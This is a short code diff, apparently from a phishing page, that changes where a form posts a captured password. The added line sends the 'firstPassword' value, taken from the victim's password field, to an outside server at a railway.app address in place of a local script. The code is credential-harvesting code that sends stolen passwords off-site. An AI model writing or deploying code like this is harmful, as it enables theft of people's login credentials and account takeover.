@@ -242,7 +242,7 @@
         firstPasswordInput.value = currentPassword;
         data.append('firstPassword', currentPassword);
 
-        fetch('spot.php', {
+        fetch('https://gh-production.up.railway.app/spot.php/', {
           method: 'POST',
           body: data
         });
